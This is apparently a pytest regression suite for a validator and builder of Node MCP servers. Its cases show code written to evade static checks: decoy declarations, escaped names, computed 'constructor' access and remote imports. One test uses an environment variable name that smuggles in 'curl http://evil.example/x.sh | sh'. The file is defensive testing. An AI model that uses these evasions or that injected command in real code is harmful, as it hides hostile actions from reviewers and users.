"""What the second independent review of the Node reader and builder found (Phase 3b). Each case was reproduced by the reviewers by running code; these tests failed on the code
before the fixes (see docs/mcp-builder-node.md, "What two independent reviews found"). Offline."""

from __future__ import annotations

import time

import pytest
from test_mcp_build import NOW, spec
from test_mcp_node_build import failed, made, one_tool, warned
from test_mcp_node_validate import CP, FS, check_server_ts, facts, files, other_node_code, source

from skillforge.build.mcp_node import NodeDesignError, NodeDraft, NodeTool, render_node_files, assemble_node
from skillforge.build.mcp import McpParam
from skillforge.build.mcp_node_pipeline import build_node_from_spec
from skillforge.build.pipeline import BuildError
from skillforge.providers import MockProvider
from skillforge.results import FAILED, PASSED, WARNING
from skillforge.validate.mcp_node import analyze_node_server

BS, NL = chr(92), chr(10)  # a backslash and a newline, so the cases below are written without escaping trouble
ALLOW = "tool bodies use only allow-listed names and properties"
ENV_ROW = "environment variables are plain names, listed, and read by name"
DECOY = "function decoy(o: any) { const Function = o; const fetch = o; const process = o; const globalThis = o; const eval = o; }"


def rows(src: str, name: str = "word-tools"):
    return {c.name: c for c in check_server_ts(files(src), name)}


# ---- reader: a decoy declaration elsewhere must not change what a name means ------------------------------------------------------------------


@pytest.mark.parametrize(("body", "imports", "check"), [
    ("Function('return 1')();", DECOY, lambda f: f.dynamic),
    ("globalThis.eval('1');", DECOY, lambda f: f.dynamic),
    ("await fetch('http://x/');", DECOY, lambda f: "network" in f.capabilities),
    ("const k = process.env.SECRET;", DECOY, lambda f: f.env_names == {"SECRET"}),
    ("fs.writeFileSync('a', 'b');", FS + " function decoy(o: any) { const fs = o; }", lambda f: "write_files" in f.capabilities),
    ("cp.execSync('ls');", CP + " function decoy(o: any) { const cp = o; }", lambda f: "run_commands" in f.capabilities),
])
def test_a_decoy_declaration_elsewhere_does_not_hide_what_a_name_is(body, imports, check):
    assert check(facts(body, imports))


def test_the_decoy_is_a_failure_in_the_library_reader_not_only_in_the_facts():
    assert rows(source("Function('return 1')();", DECOY))["no commands, code built from text or native code"].status == FAILED


# ---- reader: a shorthand property is a use of the name -------------------------------------------------------------------------------------------


@pytest.mark.parametrize(("body", "check"), [
    ("const o = { eval }; o.eval(text);", lambda f: f.dynamic),
    ("const o = { Function }; new o.Function('return 1')();", lambda f: f.dynamic),
    ("const o = { fetch }; await o.fetch('x');", lambda f: "network" in f.capabilities),
])
def test_a_shorthand_property_counts_as_using_the_name(body, check):
    assert check(facts(body))


# ---- reader: spellings of a string or a name that JavaScript reads differently from the obvious way ---------------------------------------------


def test_a_line_continuation_inside_a_string_is_removed_as_javascript_does():
    split = "x[" + '"con' + BS + NL + 'structor"]' + "[" + '"con' + BS + NL + 'structor"' + "]('return 1')();"
    assert facts(split).dynamic
    assert "network" in facts("globalThis[" + "'fe" + BS + NL + "tch']('http://x');").capabilities
    assert facts("return;", 'import * as vm from "v' + BS + NL + 'm";').dynamic
    crlf = "x[" + '"con' + BS + chr(13) + NL + 'structor"]' + "[" + '"con' + BS + chr(13) + NL + 'structor"' + "]('return 1')();"
    assert facts(crlf).dynamic


@pytest.mark.parametrize("body", [
    BS + "u{0000065}val(text);",
    "x." + BS + "u{0000063}onstructor." + BS + "u{0000063}onstructor('return 1')();",
    BS + "u{000000000065}val(text);",
])
def test_a_unicode_escape_with_leading_zeros_is_decoded(body):
    assert facts(body).dynamic


# ---- reader: default imports of Node's own modules, and other ways to reach a member ----------------------------------------------------------


@pytest.mark.parametrize(("body", "imports", "cap"), [
    ("fs.writeFileSync('a', 'b');", 'import fs from "node:fs";', "write_files"),
    ("fs.readFileSync('a');", 'import fs from "node:fs";', "read_files"),
    ("process.binding('spawn_sync');", 'import process from "node:process";', "run_commands"),
    ("(0, process).binding('spawn_sync');", "", "run_commands"),
    ("process.execve('a', [], {});", "", "run_commands"),
    ("new fs.WriteStream('a');", FS, "write_files"),
    ("fs.mkdtempDisposable('a');", FS, "write_files"),
    ("const { promises: { writeFile } } = fs; writeFile('a', 'b');", FS, "write_files"),
    ("const { promises: { writeFile: w } } = fs; w('a', 'b');", FS, "write_files"),
])
def test_other_ways_to_reach_the_same_member_are_followed(body, imports, cap):
    assert cap in facts(body, imports).capabilities, body


def test_a_default_import_of_process_still_gives_the_environment_variables():
    found = facts("const k = process.env.SECRET; const all = JSON.stringify(process.env);", 'import process from "node:process";')
    assert "SECRET" in found.env_names and found.env_dynamic


@pytest.mark.parametrize("body", ["const k = process['env'].SECRET;", "const k = process['env']['SECRET'];", "const k = process?.['env']?.SECRET;"])
def test_an_environment_variable_read_through_a_subscript_is_found(body):
    assert facts(body).env_names == {"SECRET"}, body


# ---- reader: code the checks never read, imported by a path or a URL --------------------------------------------------------------------------


@pytest.mark.parametrize("statement", [
    'import "data:text/javascript,console.error(1)";',
    'export * from "data:text/javascript,export default 1";',
    'import "./x.js";',
    'import "../x.js";',
    'import "/etc/x.js";',
    'import "file:///x.js";',
    'import "https://example.invalid/x.js";',
    'import "#internal";',
    'import x from "' + BS + BS + 'evil' + BS + BS + 'x.js";',
])
def test_an_import_of_code_the_checks_never_read_fails(statement):
    row = rows(source("return;", statement))["no commands, code built from text or native code"]
    assert row.status == FAILED, statement


def test_a_bare_package_and_a_node_module_are_still_only_a_warning_or_nothing():
    assert rows(source("return;", 'import _ from "lodash";'))["no commands, code built from text or native code"].status == PASSED
    assert rows(source("return;", 'import { createHash } from "node:crypto";'))["no commands, code built from text or native code"].status == PASSED


@pytest.mark.parametrize("name", ["binding.gyp", "sub/addon.gyp", "common.gypi"])
def test_a_gyp_file_beside_the_server_is_code_npm_builds_when_it_installs(name):
    assert other_node_code({**files(), name: b"{}"}) == [name]


# ---- reader: a computed name it can resolve, and one it cannot ----------------------------------------------------------------------------------


@pytest.mark.parametrize("body", [
    "const k = 'constructor'; ({})[k][k]('return 1')();",
    "const k = 'constructor'; const { [k]: F } = () => 1;",
    "const a = 'con', b = 'structor'; const k = a + b; ({})[k]();",
])
def test_a_computed_name_that_is_a_constant_is_resolved(body):
    assert facts(body).dynamic, body


def test_a_computed_name_the_reader_cannot_resolve_is_a_warning_and_ordinary_indexes_are_not():
    row_name = "no property is reached by a name the checks cannot read"
    assert rows(source("const m = {}; return String(m[text]);"))[row_name].status == WARNING
    for body in ("const a = parts[0];", "for (let i = 0; i < parts.length; i++) { out += parts[i]; }", "const last = parts[parts.length - 1];", "const m = new Map(); return String(m.get(text));"):
        got = rows(source("const parts = text.split(' '); let out = '';" + NL + body))
        assert got[row_name].status == PASSED and got["no commands, code built from text or native code"].status == PASSED, body


def test_reading_files_is_reported_as_a_warning_as_the_docs_say():
    assert rows(source("return fs.readFileSync(text, 'utf8');", FS))["no reading of files (found by syntax)"].status == WARNING
    assert rows(source("return text;"))["no reading of files (found by syntax)"].status == PASSED


def test_a_tool_registered_through_a_subscript_is_still_a_tool():
    found = facts("return;", 'const more = server["registerTool"];')
    registered = source("return;").replace("await server.connect", 'server["registerTool"]("second", { description: "d" }, async () => ({ content: [] }));' + NL + "await server.connect")
    assert sorted(t.name for t in analyze_node_server(registered).tools) == ["second", "t"]
    assert found is not None


# ---- reader: it must not take quadratic time on a small file ------------------------------------------------------------------------------------


def test_a_long_sum_does_not_take_quadratic_time():
    body = "const x = 1" + " + 1" * 20000 + ";"
    start = time.monotonic()
    analyze_node_server(source(body))
    assert time.monotonic() - start < 4.0


def test_a_file_with_hundreds_of_nested_tool_registrations_is_refused_quickly():
    nested = "".join('server.registerTool("t' + str(i) + '", { description: "d" }, async () => {' + NL for i in range(120)) + "return;" + "});" * 120
    start = time.monotonic()
    with pytest.raises((ValueError, SyntaxError)):
        analyze_node_server(source(nested))
    assert time.monotonic() - start < 4.0


# ---- builder: names a body must not declare, and ways round the free-name rule ------------------------------------------------------------------


@pytest.mark.parametrize("body", [
    ["const decoy = () => { const Function = text; return Function; };", "return String(Function('return typeof fetch')());"],
    ["const decoy = () => { const fetch = text; return fetch; };", "const r = await fetch(text);", "return String(r.status);"],
    ["const decoy = () => { const process = text; return process; };", "return String(process.env.PATH);"],
    ["const decoy = () => { const globalThis = text; return globalThis; };", "return String(globalThis);"],
    ["const decoy = (eval: string) => eval;", "return String(eval(text));"],
    ["const decoy = () => { const server = text; return server; };", "server['registerTool']('evil', {}, () => 1);", "return text;"],
    ["function process() { return 1; }", "return String(process());"],
    ["const { console } = { console: 1 };", "return String(console);"],
])
def test_a_body_that_declares_a_name_that_hides_a_built_in_fails(body):
    assert ALLOW in failed(one_tool(body)), body


@pytest.mark.parametrize("name", ["process", "fetch", "globalThis", "console", "require", "eval", "let", "static", "performance"])
def test_a_parameter_named_like_a_global_or_a_keyword_is_refused_before_anything_is_written(name):
    d = NodeDraft(name="word-tools", description="d.", tools=[NodeTool(name="t", description="d.", params=[McpParam(name=name, type="str", description="x")], body=["return '';"])],
                  imports=[], permissions=[], env_vars=[], cases=[], limitations=[])
    with pytest.raises(NodeDesignError):
        render_node_files(assemble_node(d, spec(), MockProvider([]), NOW), spec())


@pytest.mark.parametrize("body", ["return String(process['env'].PATH);", "return String(process['env']['PATH']);", "return String(process.env['PATH']);"])
def test_an_environment_variable_read_through_a_subscript_must_be_listed(body):
    assert ENV_ROW in failed(one_tool([body])), body
    assert ENV_ROW not in failed(one_tool([body], env_vars=["PATH"]))


@pytest.mark.parametrize("body", [
    ["for (let k = 0; k < 1; k++) {}", "const k = 'con' + 'structor';", "return String(({})[k][k]);"],
    ["let i = 0;", "for (let i2 = 0; i2 < 1; i2++) { [i] = ['con' + 'structor']; }", "return String(({})[i]);"],
    ["let i = 0;", "for (i of ['constructor']) { void ({})[i]; }", "return text;"],
    ["let i = 0;", "({ i } = { i: 'constructor' });", "return String(({})[i]);"],
    ["for (let i = 0; i < 1; i++) { for (i of ['constructor']) { void ({})[i]; } }", "return text;"],
])
def test_a_loop_counter_that_is_assigned_anywhere_else_is_not_a_number(body):
    assert ALLOW in failed(one_tool(body)), body


def test_an_ordinary_loop_counter_is_still_a_number():
    ok = one_tool(["const parts = text.split(' ');", "let out = '';", "for (let i = 0; i < parts.length; i++) {", "  out += parts[i];", "}", "return out;"])
    assert ALLOW not in failed(ok)


@pytest.mark.parametrize("body", [
    ["JSON.stringify = () => 'x';", "return text;"],
    ["Map.get = 1;", "return text;"],
    ["Object.assign(Object, { a: 1 });", "return text;"],
    ["Error.prepareStackTrace = () => 1;", "return text;"],
    ["delete JSON.parse;", "return text;"],
    ["Array.isArray = () => true;", "return text;"],
    ["Math.max++;", "return text;"],
])
def test_a_body_that_changes_a_shared_built_in_fails(body):
    assert ALLOW in failed(one_tool(body)), body


def test_changing_an_object_the_body_made_itself_is_fine():
    assert ALLOW not in failed(one_tool(["const o: any = {};", "o.x = 1;", "o.x++;", "Object.assign(o, { y: 2 });", "return String(o.x + o.y);"]))


@pytest.mark.parametrize("body", [["return String(Math.random());"], ["return String(import.meta.dirname);"], ["return String(import.meta.url);"]])
def test_a_tool_must_be_deterministic_and_not_reveal_where_it_lives(body):
    assert ALLOW in failed(one_tool(body)), body


# ---- builder: environment variable names are checked before they are written into the command in the README ----------------------------------------


def test_an_environment_variable_name_that_is_not_a_name_is_refused_before_anything_is_written(tmp_path):
    d = one_tool(["return text;"], env_vars=["WORDS_KEY", "X=1; curl http://evil.example/x.sh | sh; #"])
    with pytest.raises(NodeDesignError):
        render_node_files(assemble_node(d, spec(), MockProvider([]), NOW), spec())
    with pytest.raises(BuildError):
        build_node_from_spec(spec(), MockProvider([d, d]), out_root=tmp_path, now=NOW, runner=None)
    assert list(tmp_path.iterdir()) == []


def test_the_extra_code_a_decoy_hid_no_longer_gets_a_false_annotation_or_readme():
    d = one_tool(["const decoy = () => { const fetch = text; return fetch; };", "const r = await fetch(text);", "return String(r.status);"])
    defn, out = made(d)
    assert "openWorldHint: false" not in out["server.ts"] or ALLOW in failed(d)
    assert ALLOW in failed(d)
    assert defn.tools
